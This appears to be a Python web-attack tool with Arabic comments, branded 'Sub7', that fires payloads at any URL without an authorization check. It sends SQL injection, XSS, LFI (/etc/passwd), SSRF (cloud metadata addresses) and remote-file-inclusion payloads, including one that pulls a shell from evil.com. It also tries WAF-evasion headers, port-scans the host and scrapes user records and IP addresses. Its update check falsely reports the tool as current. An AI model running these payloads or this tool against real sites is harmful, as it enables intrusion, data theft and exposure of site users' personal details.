import argparse
import requests
import re
import socket
import threading
import time
import sys
import os
import urllib.parse
from bs4 import BeautifulSoup
from colorama import Fore, Back, Style, init

# تهيئة colorama
init(autoreset=True)

# عرض معلومات المبرمج بخط جميل وباللون الأصفر
def display_programmer_info():
    print(Fore.YELLOW + """  
    ███████╗██╗   ██╗██████╗ ███████╗
    ██╔════╝██║   ██║██╔══██╗╚════██║
    ███████╗██║   ██║██████╔╝    ██╔╝
    ╚════██║██║   ██║██╔══██╗   ██╔╝ 
    ███████║╚██████╔╝██████╔╝   ██║  
    ╚══════╝ ╚═════╝ ╚═════╝    ╚═╝  
                                     """)
    print(Fore.YELLOW + "\t\t\tBy: Saudi Linux")
    print(Fore.YELLOW + "\t\tEmail: SaudiLinux7@gmail.com\n")

# التحقق من التحديثات
def check_for_updates():
    print(Fore.CYAN + "[*] التحقق من التحديثات...")
    # هنا يمكن إضافة كود للتحقق من التحديثات
    print(Fore.GREEN + "[+] الأداة محدثة إلى آخر إصدار.")

# فحص ثغرات SQL Injection
def scan_sql_injection(url):
    print(Fore.CYAN + "\n[*] بدء فحص ثغرات SQL Injection...")
    
    # قائمة بأنماط SQL Injection للاختبار
    payloads = [
        "' OR '1'='1", 
        "\" OR \"1\"=\"1", 
        "1' OR '1'='1'--", 
        "1\" OR \"1\"=\"1\"--", 
        "' OR 1=1--", 
        "\" OR 1=1--", 
        "' OR '1'='1' --",
        "admin' --",
        "admin' #",
        "' OR 1=1 #",
        "' OR 1=1/*"
    ]
    
    # البحث عن نماذج الإدخال في الصفحة
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        if not forms:
            print(Fore.YELLOW + "[!] لم يتم العثور على نماذج إدخال في الصفحة.")
            return
        
        vulnerable = False
        for form in forms:
            form_action = form.get('action', '')
            if not form_action.startswith('http'):
                if form_action.startswith('/'):
                    form_action = url + form_action[1:]
                else:
                    form_action = url + '/' + form_action
            
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            
            for payload in payloads:
                data = {}
                for input_field in inputs:
                    input_name = input_field.get('name')
                    input_type = input_field.get('type', 'text').lower()
                    
                    if input_name:
                        if input_type == 'text' or input_type == 'password' or input_type == 'search':
                            data[input_name] = payload
                        else:
                            data[input_name] = input_field.get('value', '')
                
                try:
                    if method == 'post':
                        test_response = requests.post(form_action, data=data, timeout=10)
                    else:
                        test_response = requests.get(form_action, params=data, timeout=10)
                    
                    # التحقق من وجود أخطاء SQL في الاستجابة
                    error_patterns = [
                        "SQL syntax", "mysql_fetch", "mysql_num_rows", "mysql_result",
                        "PostgreSQL.*ERROR", "Warning.*pg_", "ORA-[0-9][0-9][0-9][0-9]",
                        "Microsoft SQL Server", "ODBC SQL Server Driver", "SQLServer JDBC Driver"
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, test_response.text, re.IGNORECASE):
                            print(Fore.RED + f"[!] تم اكتشاف ثغرة SQL Injection محتملة في النموذج: {form_action}")
                            print(Fore.RED + f"    الحقل: {input_name}, القيمة: {payload}")
                            vulnerable = True
                            break
                except Exception as e:
                    print(Fore.YELLOW + f"[!] خطأ أثناء اختبار SQL Injection: {str(e)}")
        
        if not vulnerable:
            print(Fore.GREEN + "[+] لم يتم العثور على ثغرات SQL Injection.")
    
    except Exception as e:
        print(Fore.RED + f"[!] خطأ أثناء فحص SQL Injection: {str(e)}")

# فحص ثغرات XSS
def scan_xss(url):
    print(Fore.CYAN + "\n[*] بدء فحص ثغرات XSS...")
    
    # قائمة بأنماط XSS للاختبار
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "\"><script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<script>alert(String.fromCharCode(88,83,83))</script>"
    ]
    
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        if not forms:
            print(Fore.YELLOW + "[!] لم يتم العثور على نماذج إدخال في الصفحة.")
            return
        
        vulnerable = False
        for form in forms:
            form_action = form.get('action', '')
            if not form_action.startswith('http'):
                if form_action.startswith('/'):
                    form_action = url + form_action[1:]
                else:
                    form_action = url + '/' + form_action
            
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            
            for payload in payloads:
                data = {}
                for input_field in inputs:
                    input_name = input_field.get('name')
                    input_type = input_field.get('type', 'text').lower()
                    
                    if input_name:
                        if input_type == 'text' or input_type == 'search':
                            data[input_name] = payload
                        else:
                            data[input_name] = input_field.get('value', '')
                
                try:
                    if method == 'post':
                        test_response = requests.post(form_action, data=data, timeout=10)
                    else:
                        test_response = requests.get(form_action, params=data, timeout=10)
                    
                    # التحقق من وجود الـ payload في الاستجابة
                    if payload in test_response.text:
                        print(Fore.RED + f"[!] تم اكتشاف ثغرة XSS محتملة في النموذج: {form_action}")
                        print(Fore.RED + f"    الحقل: {input_name}, القيمة: {payload}")
                        vulnerable = True
                except Exception as e:
                    print(Fore.YELLOW + f"[!] خطأ أثناء اختبار XSS: {str(e)}")
        
        if not vulnerable:
            print(Fore.GREEN + "[+] لم يتم العثور على ثغرات XSS.")
    
    except Exception as e:
        print(Fore.RED + f"[!] خطأ أثناء فحص XSS: {str(e)}")

# فحص ثغرات PHP
def scan_php_vulnerabilities(url):
    print(Fore.CYAN + "\n[*] بدء فحص ثغرات PHP...")
    
    # قائمة بملفات PHP الشائعة للاختبار
    common_files = [
        "phpinfo.php", "info.php", "test.php", "php_info.php", "i.php",
        "admin.php", "login.php", "wp-login.php", "administrator.php",
        "admin/login.php", "admin/admin.php", "admin/index.php",
        "wp-admin/login.php", "wp-admin/admin.php", "wp-admin/index.php",
        "config.php", "configuration.php", "config/config.php",
        "db.php", "database.php", "db/db.php", "db_config.php"
    ]
    
    # البحث عن ملفات PHP الشائعة
    found_files = []
    for file in common_files:
        try:
            file_url = url + '/' + file if not url.endswith('/') else url + file
            response = requests.get(file_url, timeout=5)
            if response.status_code == 200:
                found_files.append(file)
                print(Fore.YELLOW + f"[!] تم العثور على ملف PHP: {file_url}")
                
                # التحقق من وجود معلومات حساسة في phpinfo
                if file.lower() in ["phpinfo.php", "info.php", "php_info.php", "i.php"]:
                    if "phpinfo" in response.text.lower() or "php version" in response.text.lower():
                        print(Fore.RED + f"[!] تم العثور على ملف phpinfo يكشف معلومات حساسة: {file_url}")
        except:
            pass
    
    # اختبار ثغرات LFI/RFI
    lfi_payloads = [
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd",
        "../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../../../../../etc/passwd"
    ]
    
    rfi_payloads = [
        "http://evil.com/shell.txt",
        "https://pastebin.com/raw/PHShMg1c",  # مثال فقط، لا يحتوي على محتوى ضار
    ]
    
    # البحث عن معلمات URL في الصفحة
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            form_action = form.get('action', '')
            if not form_action.startswith('http'):
                if form_action.startswith('/'):
                    form_action = url + form_action[1:]
                else:
                    form_action = url + '/' + form_action
            
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            
            for input_field in inputs:
                input_name = input_field.get('name')
                if not input_name:
                    continue
                
                # اختبار LFI
                for payload in lfi_payloads:
                    test_url = f"{form_action}?{input_name}={payload}"
                    try:
                        lfi_response = requests.get(test_url, timeout=5)
                        if "root:" in lfi_response.text and ":/bin/bash" in lfi_response.text:
                            print(Fore.RED + f"[!] تم اكتشاف ثغرة LFI محتملة: {test_url}")
                            break
                    except:
                        pass
                
                # اختبار RFI
                for payload in rfi_payloads:
                    test_url = f"{form_action}?{input_name}={payload}"
                    try:
                        rfi_response = requests.get(test_url, timeout=5)
                        # هنا يمكن إضافة فحص للتحقق من نجاح RFI
                    except:
                        pass
    except Exception as e:
        print(Fore.YELLOW + f"[!] خطأ أثناء فحص ثغرات PHP: {str(e)}")
    
    if not found_files:
        print(Fore.GREEN + "[+] لم يتم العثور على ملفات PHP شائعة.")

# فحص ثغرات URL
def scan_url_vulnerabilities(url):
    print(Fore.CYAN + "\n[*] بدء فحص ثغرات URL...")
    
    # قائمة بأنماط Open Redirect للاختبار
    redirect_payloads = [
        "//evil.com",
        "//google.com",
        "//example.com",
        "https://evil.com",
        "https://google.com",
        "https://example.com",
        "%2F%2Fevil.com",
        "%2F%2Fgoogle.com",
        "%2F%2Fexample.com",
        "https%3A%2F%2Fevil.com",
        "https%3A%2F%2Fgoogle.com",
        "https%3A%2F%2Fexample.com"
    ]
    
    # قائمة بأنماط SSRF للاختبار
    ssrf_payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:5432",
        "http://127.0.0.1:6379",
        "http://127.0.0.1:11211",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/",  # GCP metadata
        "http://169.254.169.254/metadata/v1/",  # Azure metadata
    ]
    
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            form_action = form.get('action', '')
            if not form_action.startswith('http'):
                if form_action.startswith('/'):
                    form_action = url + form_action[1:]
                else:
                    form_action = url + '/' + form_action
            
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            
            # اختبار Open Redirect
            redirect_params = ['url', 'redirect', 'redirect_to', 'redirecturl', 'return', 'return_url', 'returnurl', 'goto', 'next', 'target', 'destination', 'redir', 'r']
            
            for input_field in inputs:
                input_name = input_field.get('name', '').lower()
                if not input_name:
                    continue
                
                if input_name in redirect_params or 'redirect' in input_name or 'url' in input_name or 'return' in input_name:
                    for payload in redirect_payloads:
                        data = {}
                        for inp in inputs:
                            inp_name = inp.get('name')
                            if inp_name:
                                if inp_name == input_name:
                                    data[inp_name] = payload
                                else:
                                    data[inp_name] = inp.get('value', '')
                        
                        try:
                            if method == 'post':
                                redirect_response = requests.post(form_action, data=data, timeout=5, allow_redirects=False)
                            else:
                                redirect_response = requests.get(form_action, params=data, timeout=5, allow_redirects=False)
                            
                            if redirect_response.status_code in [301, 302, 303, 307, 308]:
                                location = redirect_response.headers.get('Location', '')
                                if any(site in location for site in ['evil.com', 'google.com', 'example.com']):
                                    print(Fore.RED + f"[!] تم اكتشاف ثغرة Open Redirect محتملة: {form_action}")
                                    print(Fore.RED + f"    المعلمة: {input_name}, القيمة: {payload}, الوجهة: {location}")
                        except Exception as e:
                            pass
            
            # اختبار SSRF
            ssrf_params = ['url', 'uri', 'api', 'endpoint', 'source', 'path', 'dest', 'destination', 'callback', 'page', 'feed', 'host', 'port', 'ip', 'proxy']
            
            for input_field in inputs:
                input_name = input_field.get('name', '').lower()
                if not input_name:
                    continue
                
                if input_name in ssrf_params or 'url' in input_name or 'api' in input_name or 'endpoint' in input_name:
                    for payload in ssrf_payloads:
                        data = {}
                        for inp in inputs:
                            inp_name = inp.get('name')
                            if inp_name:
                                if inp_name == input_name:
                                    data[inp_name] = payload
                                else:
                                    data[inp_name] = inp.get('value', '')
                        
                        try:
                            if method == 'post':
                                ssrf_response = requests.post(form_action, data=data, timeout=5)
                            else:
                                ssrf_response = requests.get(form_action, params=data, timeout=5)
                            
                            # هنا يمكن إضافة فحص للتحقق من نجاح SSRF
                            # ملاحظة: من الصعب التحقق من SSRF بدون معرفة الاستجابة المتوقعة
                        except Exception as e:
                            pass
    
    except Exception as e:
        print(Fore.YELLOW + f"[!] خطأ أثناء فحص ثغرات URL: {str(e)}")

# استخراج الروابط المخفية
def extract_hidden_links(url):
    print(Fore.CYAN + "\n[*] بدء استخراج الروابط المخفية...")
    hidden_links = set()
    
    try:
        # التحقق من ملف robots.txt
        robots_url = url + '/robots.txt' if not url.endswith('/') else url + 'robots.txt'
        try:
            robots_response = requests.get(robots_url, timeout=5)
            if robots_response.status_code == 200:
                print(Fore.YELLOW + f"[!] تم العثور على ملف robots.txt: {robots_url}")
                for line in robots_response.text.split('\n'):
                    if 'Disallow:' in line or 'Allow:' in line:
                        path = line.split(':', 1)[1].strip()
                        if path and path != '/':
                            full_url = url + path if path.startswith('/') else url + '/' + path
                            hidden_links.add(full_url)
                            print(Fore.GREEN + f"[+] تم العثور على مسار في robots.txt: {full_url}")
        except:
            pass
        
        # البحث عن الروابط في التعليقات HTML
        response = requests.get(url, timeout=10)
        html_comments = re.findall(r'<!--(.+?)-->', response.text, re.DOTALL)
        for comment in html_comments:
            urls = re.findall(r'href=[\'"]([^\'"]+)[\'"]', comment)
            for u in urls:
                if not u.startswith(('http://', 'https://')):
                    u = urllib.parse.urljoin(url, u)
                hidden_links.add(u)
                print(Fore.GREEN + f"[+] تم العثور على رابط في تعليق HTML: {u}")
        
        # البحث عن الروابط في ملفات JavaScript
        soup = BeautifulSoup(response.text, 'html.parser')
        scripts = soup.find_all('script')
        for script in scripts:
            if script.has_attr('src') and script['src']:
                js_url = urllib.parse.urljoin(url, script['src'])
                try:
                    js_response = requests.get(js_url, timeout=5)
                    urls = re.findall(r'[\'"](https?://[\w\.-]+(?:/[\w\.-]+)*/?|/[\w\.-]+(?:/[\w\.-]+)*/?)[\'"]', js_response.text)
                    for u in urls:
                        if not u.startswith(('http://', 'https://')):
                            u = urllib.parse.urljoin(url, u)
                        hidden_links.add(u)
                        print(Fore.GREEN + f"[+] تم العثور على رابط في ملف JavaScript: {u}")
                except:
                    pass
        
        # البحث عن العناصر المخفية في HTML
        hidden_elements = soup.find_all(attrs={'style': re.compile(r'display:\s*none|visibility:\s*hidden')})
        for element in hidden_elements:
            links = element.find_all('a')
            for link in links:
                if link.has_attr('href'):
                    href = link['href']
                    if not href.startswith(('http://', 'https://')):
                        href = urllib.parse.urljoin(url, href)
                    hidden_links.add(href)
                    print(Fore.GREEN + f"[+] تم العثور على رابط في عنصر مخفي: {href}")
    
    except Exception as e:
        print(Fore.YELLOW + f"[!] خطأ أثناء استخراج الروابط المخفية: {str(e)}")
    
    print(Fore.CYAN + f"[*] تم العثور على {len(hidden_links)} رابط مخفي.")
    return list(hidden_links)

# تجاوز جدار حماية تطبيقات الويب (WAF)
def bypass_waf(url):
    print(Fore.CYAN + "\n[*] محاولة تجاوز جدار حماية تطبيقات الويب (WAF)...")
    
    # قائمة بترويسات HTTP المخصصة للتحايل على WAF
    custom_headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Forwarded-For": "localhost"},
        {"X-Forwarded-Host": "localhost"},
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"},
        {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
        {"Content-Type": "application/x-www-form-urlencoded"},
        {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"},
        {"Accept-Language": "en-US,en;q=0.5"},
        {"Accept-Encoding": "gzip, deflate"},
        {"Connection": "close"}
    ]
    
    # تقنيات التهرب من WAF
    evasion_techniques = [
        # تقنيات التهرب من XSS WAF
        {"payload": "<script>alert(1)</script>", "description": "XSS أساسي"},
        {"payload": "<img src=x onerror=alert(1)>", "description": "XSS باستخدام علامة img"},
        {"payload": "<svg onload=alert(1)>", "description": "XSS باستخدام علامة svg"},
        {"payload": "<ScRiPt>alert(1)</ScRiPt>", "description": "XSS مع حالة مختلطة"},
        {"payload": "<script>alert(String.fromCharCode(49))</script>", "description": "XSS مع ترميز الأحرف"},
        {"payload": "<script>\u0061lert(1)</script>", "description": "XSS مع ترميز Unicode"},
        
        # تقنيات التهرب من SQL Injection WAF
        {"payload": "1' OR 1=1 -- -", "description": "SQL Injection أساسي"},
        {"payload": "1' /*!50000OR*/ 1=1 -- -", "description": "SQL Injection مع تعليقات MySQL"},
        {"payload": "1' OR 1=1 /**/-- -", "description": "SQL Injection مع تعليقات متعددة"},
        {"payload": "1'%09OR%091=1%09--%09-", "description": "SQL Injection مع محارف التحكم"},
        {"payload": "1'%20OR%201=1%20--%20-", "description": "SQL Injection مع ترميز URL"}
    ]
    
    success = False
    
    try:
        # اختبار الترويسات المخصصة
        for header in custom_headers:
            try:
                response = requests.get(url, headers=header, timeout=10)
                if response.status_code == 200:
                    print(Fore.GREEN + f"[+] تم الوصول إلى الموقع باستخدام الترويسة: {header}")
                    success = True
            except Exception as e:
                pass
        
        # اختبار تقنيات التهرب
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            form_action = form.get('action', '')
            if not form_action.startswith('http'):
                if form_action.startswith('/'):
                    form_action = url + form_action[1:]
                else:
                    form_action = url + '/' + form_action
            
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            
            for technique in evasion_techniques:
                data = {}
                for input_field in inputs:
                    input_name = input_field.get('name')
                    input_type = input_field.get('type', 'text').lower()
                    
                    if input_name:
                        if input_type == 'text' or input_type == 'search' or input_type == 'password':
                            data[input_name] = technique["payload"]
                        else:
                            data[input_name] = input_field.get('value', '')
                
                for header in custom_headers:
                    try:
                        if method == 'post':
                            test_response = requests.post(form_action, data=data, headers=header, timeout=10)
                        else:
                            test_response = requests.get(form_action, params=data, headers=header, timeout=10)
                        
                        if test_response.status_code == 200 and technique["payload"] in test_response.text:
                            print(Fore.GREEN + f"[+] تم تجاوز WAF باستخدام: {technique['description']}")
                            print(Fore.GREEN + f"    الترويسة: {header}")
                            print(Fore.GREEN + f"    القيمة: {technique['payload']}")
                            success = True
                    except Exception as e:
                        pass
    
    except Exception as e:
        print(Fore.YELLOW + f"[!] خطأ أثناء محاولة تجاوز WAF: {str(e)}")
    
    if not success:
        print(Fore.YELLOW + "[!] لم يتم تجاوز WAF باستخدام التقنيات المتاحة.")

# فحص المنافذ المفتوحة
def scan_ports(target, ports=None, threads=50):
    print(Fore.CYAN + "\n[*] بدء فحص المنافذ المفتوحة...")
    
    # إذا لم يتم تحديد المنافذ، استخدم المنافذ الشائعة
    if not ports:
        ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
    
    # استخراج اسم المضيف من URL
    if target.startswith('http'):
        parsed_url = urllib.parse.urlparse(target)
        host = parsed_url.netloc
        if ':' in host:
            host = host.split(':')[0]
    else:
        host = target
    
    open_ports = []
    lock = threading.Lock()
    threads_list = []
    
    def check_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            if result == 0:
                service = get_service_name(port)
                risk = get_risk_level(port)
                with lock:
                    open_ports.append((port, service, risk))
                    print(Fore.GREEN + f"[+] المنفذ {port} ({service}) مفتوح - مستوى الخطورة: {risk}")
            sock.close()
        except Exception as e:
            pass
    
    def get_service_name(port):
        common_ports = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP", 110: "POP3",
            111: "RPC", 135: "RPC", 139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB",
            993: "IMAP SSL", 995: "POP3 SSL", 1723: "PPTP", 3306: "MySQL", 3389: "RDP",
            5900: "VNC", 8080: "HTTP Proxy"
        }
        return common_ports.get(port, "Unknown")
    
    def get_risk_level(port):
        high_risk_ports = [21, 23, 3389, 5900]  # FTP, Telnet, RDP, VNC
        medium_risk_ports = [22, 25, 110, 143, 3306, 8080]  # SSH, SMTP, POP3, IMAP, MySQL, HTTP Proxy
        
        if port in high_risk_ports:
            return Fore.RED + "عالي"
        elif port in medium_risk_ports:
            return Fore.YELLOW + "متوسط"
        else:
            return Fore.CYAN + "منخفض"
    
    # إنشاء وتشغيل الخيوط
    for port in ports:
        thread = threading.Thread(target=check_port, args=(port,))
        threads_list.append(thread)
        thread.start()
        
        # التحكم في عدد الخيوط المتزامنة
        if len(threads_list) >= threads:
            for t in threads_list:
                t.join()
            threads_list = []
    
    # انتظار انتهاء جميع الخيوط المتبقية
    for t in threads_list:
        t.join()
    
    if not open_ports:
        print(Fore.YELLOW + "[!] لم يتم العثور على منافذ مفتوحة.")
    else:
        print(Fore.CYAN + f"[*] تم العثور على {len(open_ports)} منفذ مفتوح.")
    
    return open_ports

# فحص المستخدمين المتصلين
def scan_online_users(url):
    print(Fore.CYAN + "\n[*] بدء فحص المستخدمين المتصلين...")
    online_users = []
    
    try:
        # محاولة الوصول إلى الصفحة الرئيسية
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # البحث عن عناصر HTML التي قد تحتوي على معلومات المستخدمين
        user_elements = soup.find_all(['div', 'span', 'li', 'a'], class_=lambda c: c and ('user' in c.lower() or 'online' in c.lower() or 'member' in c.lower()))
        
        for element in user_elements:
            user_info = element.get_text().strip()
            if user_info and len(user_info) < 100:  # تجنب النصوص الطويلة
                print(Fore.GREEN + f"[+] تم العثور على معلومات مستخدم محتملة: {user_info}")
                online_users.append({"info": user_info, "source": "HTML Element"})
        
        # التحقق من صفحات المستخدمين المتصلين الشائعة
        common_online_pages = [
            "online.php", "online-users.php", "users/online", "members/online",
            "who-is-online", "active-users", "online-members", "users.php",
            "members.php", "userlist.php", "memberlist.php"
        ]
        
        for page in common_online_pages:
            page_url = url + '/' + page if not url.endswith('/') else url + page
            try:
                page_response = requests.get(page_url, timeout=5)
                if page_response.status_code == 200:
                    page_soup = BeautifulSoup(page_response.text, 'html.parser')
                    
                    # البحث عن عناصر المستخدمين
                    user_elements = page_soup.find_all(['div', 'span', 'li', 'a'], class_=lambda c: c and ('user' in c.lower() or 'online' in c.lower() or 'member' in c.lower()))
                    
                    for element in user_elements:
                        user_info = element.get_text().strip()
                        if user_info and len(user_info) < 100:
                            print(Fore.GREEN + f"[+] تم العثور على معلومات مستخدم في {page}: {user_info}")
                            online_users.append({"info": user_info, "source": f"Page: {page}"})
            except:
                pass
        
        # محاولة الوصول إلى نقاط نهاية API شائعة
        api_endpoints = [
            "api/users", "api/online", "api/members", "api/v1/users",
            "api/v1/online", "api/v1/members", "api/v2/users",
            "api/v2/online", "api/v2/members", "users/api",
            "members/api", "online/api"
        ]
        
        for endpoint in api_endpoints:
            api_url = url + '/' + endpoint if not url.endswith('/') else url + endpoint
            try:
                api_response = requests.get(api_url, timeout=5)
                if api_response.status_code == 200:
                    try:
                        # محاولة تحليل الاستجابة كـ JSON
                        json_data = api_response.json()
                        print(Fore.GREEN + f"[+] تم العثور على نقطة نهاية API محتملة: {api_url}")
                        
                        # استخراج معلومات المستخدمين من JSON
                        if isinstance(json_data, list):
                            for item in json_data:
                                if isinstance(item, dict) and ('user' in item or 'name' in item or 'username' in item or 'email' in item):
                                    user_info = str(item)
                                    print(Fore.GREEN + f"[+] تم العثور على معلومات مستخدم في API: {user_info}")
                                    online_users.append({"info": user_info, "source": f"API: {endpoint}"})
                        elif isinstance(json_data, dict):
                            if 'users' in json_data and isinstance(json_data['users'], list):
                                for user in json_data['users']:
                                    user_info = str(user)
                                    print(Fore.GREEN + f"[+] تم العثور على معلومات مستخدم في API: {user_info}")
                                    online_users.append({"info": user_info, "source": f"API: {endpoint}"})
                    except:
                        # إذا لم تكن الاستجابة JSON صالحة
                        pass
            except:
                pass
        
        # البحث عن عناوين IP في الصفحة
        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        ips = re.findall(ip_pattern, response.text)
        for ip in ips:
            if ip != "127.0.0.1" and not ip.startswith("192.168.") and not ip.startswith("10.") and not ip.startswith("172."):
                print(Fore.GREEN + f"[+] تم العثور على عنوان IP محتمل: {ip}")
                online_users.append({"info": f"IP: {ip}", "source": "Page Content"})
    
    except Exception as e:
        print(Fore.YELLOW + f"[!] خطأ أثناء فحص المستخدمين المتصلين: {str(e)}")
    
    if not online_users:
        print(Fore.YELLOW + "[!] لم يتم العثور على معلومات عن المستخدمين المتصلين.")
    else:
        print(Fore.CYAN + f"[*] تم العثور على {len(online_users)} معلومة عن المستخدمين المتصلين.")
    
    return online_users

# الدالة الرئيسية
def main():
    parser = argparse.ArgumentParser(description='Sub7 - أداة فحص أمان المواقع')
    parser.add_argument('-u', '--url', help='URL الهدف للفحص', required=True)
    parser.add_argument('--sql', help='فحص ثغرات SQL Injection', action='store_true')
    parser.add_argument('--xss', help='فحص ثغرات XSS', action='store_true')
    parser.add_argument('--php', help='فحص ثغرات PHP', action='store_true')
    parser.add_argument('--url-vuln', help='فحص ثغرات URL', action='store_true')
    parser.add_argument('--hidden-links', help='استخراج الروابط المخفية', action='store_true')
    parser.add_argument('--bypass-waf', help='محاولة تجاوز WAF', action='store_true')
    parser.add_argument('--ports', help='فحص المنافذ المفتوحة', action='store_true')
    parser.add_argument('--port-range', help='نطاق المنافذ للفحص (مثال: 1-1000)', default='1-1000')
    parser.add_argument('--online-users', help='فحص المستخدمين المتصلين', action='store_true')
    parser.add_argument('--all', help='تنفيذ جميع الفحوصات', action='store_true')
    
    args = parser.parse_args()
    
    # عرض معلومات المبرمج
    display_programmer_info()
    
    # التحقق من التحديثات
    check_for_updates()
    
    url = args.url
    if not url.startswith('http'):
        url = 'http://' + url
    
    print(Fore.CYAN + f"[*] بدء الفحص على: {url}")
    
    # تنفيذ الفحوصات المطلوبة
    if args.all or args.sql:
        scan_sql_injection(url)
    
    if args.all or args.xss:
        scan_xss(url)
    
    if args.all or args.php:
        scan_php_vulnerabilities(url)
    
    if args.all or args.url_vuln:
        scan_url_vulnerabilities(url)
    
    hidden_links = []
    if args.all or args.hidden_links:
        hidden_links = extract_hidden_links(url)
        
        # فحص الروابط المخفية
        if hidden_links and (args.all or args.sql or args.xss or args.php or args.url_vuln):
            print(Fore.CYAN + "\n[*] فحص الروابط المخفية...")
            for link in hidden_links:
                print(Fore.CYAN + f"\n[*] فحص الرابط: {link}")
                if args.all or args.sql:
                    scan_sql_injection(link)
                if args.all or args.xss:
                    scan_xss(link)
                if args.all or args.php:
                    scan_php_vulnerabilities(link)
                if args.all or args.url_vuln:
                    scan_url_vulnerabilities(link)
    
    if args.all or args.bypass_waf:
        bypass_waf(url)
    
    if args.all or args.ports:
        if args.port_range:
            try:
                if '-' in args.port_range:
                    start_port, end_port = map(int, args.port_range.split('-'))
                    ports = range(start_port, end_port + 1)
                else:
                    ports = [int(p) for p in args.port_range.split(',')]
                scan_ports(url, ports)
            except ValueError:
                print(Fore.RED + "[!] تنسيق نطاق المنافذ غير صالح. استخدم التنسيق '1-1000' أو '80,443,8080'")
                scan_ports(url)
        else:
            scan_ports(url)
    
    if args.all or args.online_users:
        scan_online_users(url)
    
    print(Fore.CYAN + "\n[*] اكتمل الفحص.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] تم إيقاف الفحص بواسطة المستخدم.")
    except Exception as e:
        print(Fore.RED + f"\n[!] حدث خطأ: {str(e)}")